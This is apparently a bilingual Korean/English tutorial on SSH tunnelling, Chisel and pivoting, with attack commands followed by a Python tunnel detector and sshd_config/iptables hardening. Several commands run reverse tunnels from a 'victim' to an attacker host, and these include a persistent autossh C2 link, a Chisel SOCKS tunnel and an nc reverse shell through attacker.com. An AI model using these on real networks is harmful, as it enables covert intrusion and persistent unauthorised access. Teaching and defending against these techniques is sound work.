> 🌐 **Language / 언어**: [🇰🇷 한국어](#한국어) | [🇺🇸 English](#english)

---

<a name="한국어"></a>

# SSH 터널링 & 포트 포워딩 — 공격과 방어

## 1. SSH 포워딩 유형

```
로컬 포워딩 (-L):
  공격자 로컬 포트 → SSH → 원격 네트워크 내 서비스
  사용: 방화벽으로 막힌 내부 서비스 접근

원격 포워딩 (-R):
  원격 서버 포트 → SSH → 로컬 서비스
  사용: 피해자 내부 네트워크 서비스를 공격자에게 노출

동적 포워딩 (-D):
  로컬 SOCKS5 프록시 생성
  사용: 내부 네트워크 전체를 프록시로 사용

```

---

## 2. 로컬 포트 포워딩 (-L)

SSH 로컬 포트 포워딩으로 원격 서비스에 로컬에서 접근합니다. 방화벽으로 직접 접근이 차단된 내부 서비스에 SSH 터널을 통해 연결합니다.

```bash
# 기본 구조
ssh -L [로컬포트]:[대상호스트]:[대상포트] [중간서버]

# 예시: 방화벽 안의 DB 서버에 접근
# 내부: DB 서버(192.168.1.10:3306), 점프 서버(10.0.0.1)
ssh -L 13306:192.168.1.10:3306 user@10.0.0.1 -N -f

# 이후 로컬에서 직접 접근
mysql -h 127.0.0.1 -P 13306 -u root -p

# 여러 포트 동시 포워딩
ssh -L 13306:192.168.1.10:3306 \
    -L 18080:192.168.1.20:80 \
    -L 15432:192.168.1.30:5432 \
    user@10.0.0.1 -N -f

# 옵션 설명
#  -N : 원격 명령 실행 없이 포워딩만
#  -f : 백그라운드 실행
#  -C : 압축 활성화
#  -q : 조용히 (경고 메시지 억제)
```

---

## 3. 원격 포트 포워딩 (-R) — 리버스 터널

SSH 원격 포트 포워딩으로 내부 서비스를 외부에 노출합니다. 방화벽 뒤의 피해자 서비스를 공격자 서버를 통해 접근할 수 있게 합니다.

```bash
# 피해자 내부 서비스를 공격자 서버에 노출
# 구조: [공격자:공격자포트] ← SSH ← [피해자 내부 서비스]

# 피해자에서 실행
ssh -R 0.0.0.0:18080:127.0.0.1:80 attacker@공격자IP -N -f

# 공격자 서버에서 확인
curl http://localhost:18080

# 공격자 서버 /etc/ssh/sshd_config 설정
GatewayPorts yes  # 외부에서 공격자 서버 포트 접근 허용

# 실전: 내부 SMB 서비스 노출
ssh -R 14445:192.168.1.5:445 attacker@공격자IP -N -f
# → 공격자 서버 4445 포트로 내부 SMB 직접 접근
```

### 자동 재연결 리버스 터널

autossh로 SSH 리버스 터널을 자동 재연결합니다. 네트워크 불안정 환경에서 C2 연결을 안정적으로 유지하는 데 사용합니다.

```bash
# autossh로 연결 끊겨도 자동 재연결
apt install autossh

# 피해자 시스템에서
autossh -M 20000 -N \
  -R 0.0.0.0:19999:127.0.0.1:22 \
  attacker@공격자IP \
  -i /path/to/key \
  -o ServerAliveInterval=30 \
  -o ServerAliveCountMax=3 \
  -o ExitOnForwardFailure=yes

# systemd 서비스로 등록하면 부팅 시 자동 시작
```

---

## 4. 동적 포워딩 (-D) — SOCKS 프록시

SSH SOCKS 프록시로 모든 TCP 트래픽을 터널링합니다. 프록시체인(proxychains)과 함께 사용하여 내부 네트워크 서비스에 투명하게 접근합니다.

```bash
# SOCKS5 프록시 생성 (로컬 1080 포트)
ssh -D 1080 user@점프서버IP -N -f

# proxychains 설정
cat >> /etc/proxychains4.conf << 'EOF'
socks5  127.0.0.1 1080
EOF

# proxychains를 통해 내부망 모든 도구 사용
proxychains nmap -sT -Pn 192.168.1.0/24
proxychains curl http://192.168.1.100
proxychains python3 exploit.py
proxychains msfconsole

# 브라우저 설정
# Firefox: Manual SOCKS5 → 127.0.0.1:1080
```

---

## 5. 다중 홉 터널링 (Pivoting)

```bash
# 시나리오: 공격자 → 서버A → 서버B → 내부DB
# 서버A: 10.0.0.1, 서버B: 172.16.0.1, DB: 192.168.1.10:3306

# 방법 1: 중첩 SSH 터널
# A에서 B로 터널 (A에서 실행)
ssh -L 0.0.0.0:23306:192.168.1.10:3306 user@172.16.0.1 -N -f

# 공격자에서 A를 경유해 DB 접근
ssh -L 13306:127.0.0.1:23306 user@10.0.0.1 -N -f
mysql -h 127.0.0.1 -P 13306 -u root -p

# 방법 2: ProxyJump (-J) — 단일 명령
ssh -J user@10.0.0.1,user@172.16.0.1 user@192.168.1.10

# 방법 3: ~/.ssh/config 설정
cat >> ~/.ssh/config << 'EOF'
Host bastion
  HostName 10.0.0.1
  User user

Host internal
  HostName 172.16.0.1
  User user
  ProxyJump bastion

Host deepinternal
  HostName 192.168.1.10
  User user
  ProxyJump internal
EOF

ssh deepinternal
```

---

## 6. Chisel — 방화벽 우회 HTTP 터널링

chisel 도구로 HTTP/HTTPS 위에서 동작하는 TCP 터널을 구성합니다. 웹 트래픽만 허용하는 방화벽 환경에서 방화벽 우회 터널을 만들 수 있습니다.

```bash
# Chisel: HTTP/HTTPS 위에서 동작하는 TCP/UDP 터널
# 방화벽이 SSH를 막아도 HTTP(S) 허용이면 사용 가능

# 설치
go install github.com/jpillora/chisel@latest

# 공격자 서버 (서버 모드)
chisel server --port 8080 --reverse

# 피해자 (클라이언트 모드) — 리버스 터널
chisel client 공격자IP:8080 R:1080:socks     # SOCKS 프록시
chisel client 공격자IP:8080 R:18080:192.168.1.10:80  # 특정 포트

# 로컬 포워딩
chisel client 공격자IP:8080 3306:192.168.1.10:3306
```

---

## 7. SSH 터널링 탐지


SSH 터널링은 방화벽과 NAT를 우회하여 원격 서비스에 안전하게 접근하는 기법입니다. 로컬 포워딩(`-L`), 리버스 포워딩(`-R`), SOCKS 프록시(`-D`) 세 가지 방식이 있으며, 침투 테스트에서 내부망 피버팅에 핵심적으로 활용됩니다.

```python
import subprocess
import re
import argparse
from dataclasses import dataclass

@dataclass
class SshTunnel:
    pid: str
    user: str
    local_port: str
    remote_host: str
    remote_port: str
    direction: str  # local / remote / dynamic

def detect_ssh_tunnels() -> list[SshTunnel]:
    tunnels: list[SshTunnel] = []

    try:
        result = subprocess.run(
            ["ps", "aux"], capture_output=True, text=True
        )
        for line in result.stdout.splitlines():
            if "ssh" not in line.lower():
                continue

            pid_match = re.search(r'^\S+\s+(\d+)', line)
            user_match = re.search(r'^(\S+)', line)
            pid  = pid_match.group(1)  if pid_match  else "?"
            user = user_match.group(1) if user_match else "?"

            # 로컬 포워딩 -L
            for m in re.finditer(r'-L\s*(\d+):([^:]+):(\d+)', line):
                tunnels.append(SshTunnel(
                    pid, user, m.group(1), m.group(2), m.group(3), "local"
                ))
            # 원격 포워딩 -R
            for m in re.finditer(r'-R\s*[\d.]*:?(\d+):([^:]+):(\d+)', line):
                tunnels.append(SshTunnel(
                    pid, user, m.group(1), m.group(2), m.group(3), "remote"
                ))
            # 동적 포워딩 -D
            for m in re.finditer(r'-D\s*(\d+)', line):
                tunnels.append(SshTunnel(
                    pid, user, m.group(1), "SOCKS5", "1080", "dynamic"
                ))
    except Exception as e:
        print(f"오류: {e}")

    return tunnels

def main() -> None:
    parser = argparse.ArgumentParser(description="SSH 터널 탐지")
    parser.add_argument("--watch", action="store_true", help="주기적 모니터링")
    args = parser.parse_args()

    tunnels = detect_ssh_tunnels()
    if not tunnels:
        print("[*] 활성 SSH 터널 없음")
    else:
        print(f"[!] SSH 터널 {len(tunnels)}개 감지:\n")
        for t in tunnels:
            direction_label = {"local": "→ 로컬", "remote": "← 리버스", "dynamic": "SOCKS"}.get(t.direction, t.direction)
            print(f"  [{direction_label}] PID={t.pid} USER={t.user}")
            print(f"    포트 {t.local_port} ↔ {t.remote_host}:{t.remote_port}")

if __name__ == "__main__":
    main()
```

---

## 8. 방어 설정

### sshd_config 보안 강화

sshd_config 파일로 SSH 서버를 강화합니다. 루트 로그인 차단, 공개키 인증 전용, 포트 포워딩 제한 등 필수 보안 설정을 적용합니다.

```bash
# /etc/ssh/sshd_config

# 터널링 관련 제한
AllowTcpForwarding no          # TCP 포워딩 전면 금지
GatewayPorts no                # 외부 → 포워딩 포트 차단
PermitTunnel no                # TUN/TAP 터널 차단
X11Forwarding no               # X11 포워딩 차단
AllowStreamLocalForwarding no  # Unix 소켓 포워딩 차단

# 특정 그룹만 포워딩 허용 (보안팀 등)
Match Group sshforward
    AllowTcpForwarding yes

# 기타 보안 설정
PermitRootLogin no
PasswordAuthentication no      # 키 인증만 허용
MaxAuthTries 3
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 30

systemctl restart sshd
```

### 방화벽으로 SSH 포워딩 제한

```bash
# 허가된 SSH 출발지 IP만 허용
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# 비정상 포트로 나가는 SSH 연결 차단
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j LOG --log-prefix "SSH-ANOMALY: "
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP
```

---

<a name="english"></a>

# SSH Tunneling & Port Forwarding — Attack and Defense

## 1. SSH Forwarding Types

```
SSH Forwarding Methods:

Local Port Forwarding (-L):
  Your machine → SSH server → Target
  Use case: Access internal resources from outside
  Command: ssh -L local_port:target_host:target_port user@ssh_server

Remote Port Forwarding (-R):
  Target → SSH server → Your machine
  Use case: Expose internal service to outside (reverse tunnel)
  Command: ssh -R remote_port:local_host:local_port user@ssh_server

Dynamic Port Forwarding (-D):
  SOCKS proxy through SSH tunnel
  Use case: Route all traffic through remote server
  Command: ssh -D local_port user@ssh_server
```

---

## 2. Local Port Forwarding Examples

```bash
# Access internal database from outside
# Situation: DB server at 192.168.1.100:3306 is only accessible from jump server
ssh -L 3307:192.168.1.100:3306 user@jump_server.example.com -N

# Now connect locally:
mysql -h 127.0.0.1 -P 3307 -u admin -p

# Access internal web application
ssh -L 8080:internal-app.local:80 user@bastion.example.com -N
# Now browse: http://localhost:8080

# Multiple tunnels at once
ssh -L 3307:db:3306 -L 8080:web:80 -L 6379:redis:6379 user@bastion -N
```

---

## 3. Remote Port Forwarding (Reverse Tunnel)

```bash
# Expose internal service to external server
# Situation: Internal web server needs to be accessible from internet

# On internal machine:
ssh -R 8080:localhost:80 user@external.server.com -N
# Now: http://external.server.com:8080 → your internal :80

# Reverse shell via SSH tunnel (red team use)
# Attacker's server:
ssh -R 4444:localhost:4444 user@attacker.com -N

# Victim machine:
# nc 127.0.0.1 4444 → through tunnel → back to attacker

# Enable GatewayPorts in /etc/ssh/sshd_config for external access:
# GatewayPorts yes
```

---

## 4. Dynamic SOCKS Proxy

```bash
# Create SOCKS5 proxy through SSH
ssh -D 1080 user@jump_server.example.com -N -f

# Use proxy with tools
# proxychains4 configuration (/etc/proxychains4.conf):
# [ProxyList]
# socks5 127.0.0.1 1080

# Run tools through proxy
proxychains4 nmap -sT -p 80,443,8080 192.168.1.0/24
proxychains4 sqlmap -u "http://internal-app.local/page?id=1"
proxychains4 curl http://internal-resource.local

# Browser proxy settings:
# Firefox: Settings → Network → SOCKS proxy → 127.0.0.1:1080
```

---

## 5. SSH Hardening

```bash
# /etc/ssh/sshd_config hardening

# Disable root login
PermitRootLogin no

# Disable password authentication (use keys only)
PasswordAuthentication no
PubkeyAuthentication yes

# Allow only specific users
AllowUsers admin devops
AllowGroups sshusers

# Disable X11 forwarding
X11Forwarding no

# Disable port forwarding (if not needed)
AllowTcpForwarding no
GatewayPorts no

# Use strong ciphers
Ciphers chacha20-poly1305@openssh.com,aes256-gcm@openssh.com
MACs hmac-sha2-512-etm@openssh.com,hmac-sha2-256-etm@openssh.com
KexAlgorithms curve25519-sha256,diffie-hellman-group16-sha512

# Connection timeout
ClientAliveInterval 300
ClientAliveCountMax 2
LoginGraceTime 30
MaxAuthTries 3
```

```bash
# iptables: Allow only authorized SSH source IPs
iptables -A INPUT -p tcp --dport 22 -s 10.0.0.0/8 -j ACCEPT
iptables -A INPUT -p tcp --dport 22 -j DROP

# Block outgoing SSH connections not from sshd process
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j LOG --log-prefix "SSH-ANOMALY: "
iptables -A OUTPUT -p tcp --dport 22 -m owner ! --uid-owner sshd -j DROP
